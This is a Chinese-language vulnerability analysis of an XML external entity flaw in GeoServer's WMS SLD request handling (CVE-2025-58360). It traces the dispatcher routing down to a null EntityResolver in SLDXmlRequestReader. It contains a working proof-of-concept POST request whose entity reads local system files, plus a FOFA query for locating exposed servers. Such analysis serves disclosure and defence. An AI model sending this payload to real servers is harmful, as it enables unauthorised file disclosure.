# GeoServer XML外部实体注入漏洞(CVE-2025-58360)

fofa:app="GeoServer" 



![image-20251127102444819](/Users/ddea/Library/Application Support/typora-user-images/image-20251127102444819.png)



##### poc

```
POST /geoserver/wms?service=WMS&version=1.1.0&request=GetMap&layers=topp:states&bbox=-130,24,-66,50&width=800&height=400&srs=EPSG:4326&format=image/png HTTP/1.1
Host: 192.168.7.132:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Accept-Encoding: gzip, deflate, br
Content-Type: application/vnd.ogc.sld+xml
Content-Length: 275

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE StyledLayerDescriptor [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><StyledLayerDescriptor version="1.0.0" xmlns="http://www.opengis.net/sld"><NamedLayer><Name>&xxe;</Name><UserStyle/></NamedLayer></StyledLayerDescriptor>
```



##### 复现

![image-20251127113107201](/Users/ddea/Library/Application Support/typora-user-images/image-20251127113107201.png)





![image-20251127153033073](/Users/ddea/Library/Application Support/typora-user-images/image-20251127153033073.png)

### 1.geoserver http请求解析流程

geoserver/wms 和 /geoserver/wms/* 被映射到一个统一的调度控制器，入口是 org.geoserver.ows.Dispatcher 。映射配置在 wms 模块的 Spring 配置里：wms/src/main/java/applicationContext.xml:429-431

```
<bean id="wmsURLMapping" 
    class="org.geoserver.ows.OWSHandlerMapping">
    <constructor-arg ref="catalog"/>
    <property name="alwaysUseFullPath" value="true"/>
    <property name="interceptors">
       <list>
           <ref bean="wmsCiteComplianceHack"/>
       </list>
    </property>
    <property name="mappings">
       <props>
           <prop key="/kml/icon/**/*">kmlIconService</prop>
          <prop key="/wms">dispatcher</prop>
          <prop key="/wms/*">dispatcher</prop>
       </props>
    </property>
</bean> 
<!--  
```





dispatcher 控制器由主模块声明：main/src/main/java/applicationContext.xml:145-147

```
<bean id="dispatcher" class="org.geoserver.ows.Dispatcher"/>
```



Dispatcher 的核心入口方法是 handleRequestInternal(HttpServletRequest, HttpServletResponse) ：ows/src/main/java/org/geoserver/ows/Dispatcher.java:224-286



handleRequestInternal(...) 总控流程：ows/src/main/java/org/geoserver/ows/Dispatcher.java:224-286
- 预处理和创建 Request ：224-234
- init(...) 初始化与参数解析（KVP/POST XML/SOAP/Multipart）并存入线程本地：238-243
- 选择服务 service(...) ，支持从 path 推断（兼容 <service>/<request> 风格）：245-253, 526-553
- 分发操作 dispatch(...) ，将 Request 映射到目标服务方法、准备参数：258-266, 664-843
- 执行操作 execute(...) ：269-274, 886-915
- 写出响应 response(...) ：271-274, 925-1079
- 异常处理与回调收尾：275-286, 1698-1797, 1800-1848, 302-310

```java
protected ModelAndView handleRequestInternal(
        HttpServletRequest httpRequest, HttpServletResponse httpResponse) throws Exception {
    preprocessRequest(httpRequest);

    // create a new request instance
    Request request = new Request();

    // set request / response
    request.setHttpRequest(httpRequest);
    request.setHttpResponse(httpResponse);

    Service service = null;

    try {
        // initialize the request and allow callbacks to override it
        request = init(request);

        // store it in the thread local
        REQUEST.set(request);

        // find the service
        try {
            service = service(request);
        } catch (Throwable t) {
            exception(t, null, request);

            return null;
        }

        // throw any outstanding errors
        if (request.getError() != null) {
            throw request.getError();
        }

        // dispatch the operation
        Operation operation = dispatch(request, service);
        request.setOperation(operation);

        if (request.isSOAP()) {
            // let the request object know that this is a SOAP request, since it effects
            // often how the request will be encoded
            flagAsSOAP(operation);
        }

        // execute it
        Object result = execute(request, operation);

        // write the response
        if (result != null) {
            response(result, request, operation);
        }
    } catch (Throwable t) {
        // make Spring security exceptions flow so that exception transformer filter can handle
        // them
        if (isSecurityException(t)) throw (Exception) t;
        exception(t, service, request);
    } finally {
        fireFinishedCallback(request);
        REQUEST.remove();
    }

    return null;
}
```



### 2. 漏洞利用流程分析
##### 2.1入口 (Entrance): 请求首先进入 GeoServer 的核心分发控制器 org.geoserver.ows.Dispatcher 。

- URL 中的 service=WMS 和 request=GetMap 告诉 Dispatcher 这是一个 WMS GetMap 请求。
- 请求体 (Body) 是 XML 格式，且根元素是 <StyledLayerDescriptor> 。

##### 2.2路由与解析 (Routing & Parsing): Dispatcher 需要找到一个合适的 RequestReader 来解析请求体。

- GeoServer 注册了多个 Reader。其中， org.geoserver.sld.SLDXmlRequestReader 被注册用于处理命名空间为 http://www.opengis.net/sld 且根元素为 StyledLayerDescriptor 的 XML 请求。
- 因为你的 Payload 正好符合这个特征（ <!DOCTYPE StyledLayerDescriptor ...> ）， Dispatcher 选中了 SLDXmlRequestReader 来处理这个请求体。

##### 2.3 触发漏洞 (Trigger): 漏洞发生在 SLDXmlRequestReader 的 read 方法中。

SLDXmlRequestReader.read() 方法被调用。

该方法内部调用了 Styles.handler(...) 来获取 SLD 解析器，并调用其 parse 方法：
```java
// 关键漏洞代码位置：SLDXmlRequestReader.java
StyledLayerDescriptor sld =
        Styles.handler(getMap.getStyleFormat())
                .parse(reader, getMap.styleVersion(), null, null); // 第四个参数是 
                EntityResolver，传入了 null
```

关键点 ：它在调用 parse 方法时， 显式传入了 null 作为 EntityResolver 。

底层的 XML 解析器（由 GeoTools 的 SLDParser 封装）在解析 XML 时，如果没有提供自定义的 EntityResolver 来拦截或禁止外部实体，且默认配置未禁用 DTD 处理，就会尝试解析定义的外部实体。

解析器读取到 <!ENTITY xxe SYSTEM "file:///etc/passwd"> ，并尝试访问文件系统读取 /etc/passwd 的内容。

读取到的内容被替换到 <Name>&xxe;</Name> 中。
结果 (Result):

- 解析后的 StyledLayerDescriptor 对象中，Layer 的名称（Name）包含了 /etc/passwd 的内容。
- 如果在后续处理中（如报错信息回显、或者生成的图片中包含图层名称），攻击者就能看到文件内容。
### 3. 存在问题的类 (Vulnerable Class)
类名 : org.geoserver.sld.SLDXmlRequestReader 文件路径 : /Users/ddea/java/geoserver-2.26.0/src/wms/src/main/java/org/geoserver/sld/SLDXmlRequestReader.java

问题代码片段 :

```java
@Override
public Object read(Object request, Reader reader, Map kvp) throws Exception {
    // ...
    try {
        GetMapRequest getMap = (GetMapRequest) request;
        // 漏洞点：最后两个参数传入了 null，特别是最后一个参数 EntityResolver
        StyledLayerDescriptor sld =
                Styles.handler(getMap.getStyleFormat())
                        .parse(reader, getMap.styleVersion(), null, null); 
        // ...
    } catch (IOException e) {
        throw new ServiceException(cleanException(e));
    }
}
```
### 4. 为什么会有这个漏洞 (Root Cause)
这个漏洞的根本原因是在实现 SLDXmlRequestReader 时， 没有注入安全防护组件 EntityResolver 。

- 对比安全实现 :
  在同级目录下的 GetMapXmlReader (用于处理标准 XML GetMap 请求) 或 GetMapKvpRequestReader (处理 KVP 参数) 中，开发者都正确获取并使用了 EntityResolver ：
  
  ```java
  // 安全的写法示例 (来自 GetMapXmlReader)
  EntityResolver entityResolver = wms.getCatalog().getResourcePool().getEntityResolver
  ();
  if (entityResolver != null) {
      db.setEntityResolver(entityResolver); // 注入防护，阻止非法外部实体访问
  }
  ```
  
- 疏忽 : SLDXmlRequestReader 直接传入了 null ，导致 GeoServer 提供的用于防御 XXE 攻击的机制（ EntityResolverProvider ）在这个特定的请求路径上失效了。这使得底层的 XML 解析器以默认（不安全）的方式运行，从而允许了解析外部实体。

  

### 5.为什么由SLDXmlRequestReader执行xml解析

##### 5.1.预读取与特征提取 (Pre-reading & Feature Extraction)

​	当 Dispatcher 接收到一个 POST 请求且包含 XML Body 时，它首先需要知道这个 XML 是什么，才能决定交给谁去处理。

​	在 Dispatcher 类中，有一个静态方法 readOpPost(Request req)（大约在 1603 行），它的作用就是**预读取** XML 的前一部分内容（通常是前 8KB，由 XML_LOOKAHEAD 定义），仅仅是为了解析出 XML 的**根元素 (Root Element)** 和它的 **命名空间 (Namespace)**。

- **代码逻辑** (readOpPost):

  ```java
  Java
  
  // 创建一个轻量级的 XML 解析器，只读取头部
  XMLStreamReader parser = createParserForRootElement(req);
  // ...
  // 找到第一个开始标签（根元素）
  namespace = parser.getNamespaceURI(); // 获取命名空间
  elementName = parser.getLocalName();  // 获取根标签名
  // ...
  req.setNamespace(normalize(namespace));
  req.setPostRequestElementName(normalize(elementName));
  ```

- **你的 Payload**:

  ```java
  XML
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE StyledLayerDescriptor ...>
  <StyledLayerDescriptor version="1.0.0" xmlns="http://www.opengis.net/sld">
  ...
  </StyledLayerDescriptor>
  ```

- **提取结果**:

  - elementName (根元素名) = StyledLayerDescriptor
  - namespace (命名空间) = http://www.opengis.net/sld (由 xmlns 属性定义)

Dispatcher 把这两个关键信息存到了 Request 对象中。

##### 5.2. 查找匹配的 Reader (Finding the Matching Reader)

接下来，Dispatcher 调用 parseRequestXML 方法（大约 1556 行），试图找到一个能处理这个根元素的 XmlRequestReader。

- **代码逻辑** (parseRequestXML -> findXmlReader):

  ```java
  Java
  String namespace = request.getNamespace(); // "http://www.opengis.net/sld"
  String element = request.getPostRequestElementName(); // "StyledLayerDescriptor"
  
  // 调用查找方法
  XmlRequestReader xmlReader = findXmlReader(namespace, element, service, version);
  ```

- **查找逻辑** (findXmlReader, 大约 1326 行): GeoServer 启动时，各个模块（WMS, WFS 等）会向系统注册自己的 XmlRequestReader。

  - SLDXmlRequestReader

     

    在它的构造函数中是这样定义的：

    ```java
    Java
    
    public SLDXmlRequestReader(WMS wms) {
        // 注册自己处理 namespace="http://www.opengis.net/sld", 
        element="StyledLayerDescriptor"
        super("http://www.opengis.net/sld", "StyledLayerDescriptor");
        this.wms = wms;
    }
    ```

  findXmlReader 会遍历所有注册的 Reader，寻找匹配项：

  ```java
  Java
  
  for (XmlRequestReader xmlReader : xmlReaders) {
      QName xmlElement = xmlReader.getElement();
      
      // 比较标签名： "StyledLayerDescriptor" == "StyledLayerDescriptor" ? 是
      if (xmlElement.getLocalPart().equalsIgnoreCase(element)) {
          // 比较命名空间： "http://www.opengis.net/sld" == "http://www.opengis.net/
          sld" ? 是
          if (xmlElement.getNamespaceURI().equalsIgnoreCase(namespace)) {
              matches.add(xmlReader); // 找到了！
          }
      }
  }
  ```

##### 5.3. 为什么不是其他的 Reader？

通常 WMS 的 POST 请求是 GetMap 请求，其 XML 结构如下：

```java
XML

<GetMap xmlns="http://www.opengis.net/ows" ...>
  ...
</GetMap>
```

如果是这种请求，elementName 就是 GetMap，Dispatcher 就会找到 GetMapXmlReader。

但你的 Payload 比较特殊，虽然 URL 参数里写了 request=GetMap，但 Body 里的根元素却是 <StyledLayerDescriptor>。 GeoServer 的设计允许这种“混合”请求：用 URL 参数传递 WMS 参数，但用 XML Body 传递 SLD 样式。

因为 Body 的根元素是 StyledLayerDescriptor，所以 Dispatcher 严格按照 XML 内容匹配，最终**精准命中**了 SLDXmlRequestReader。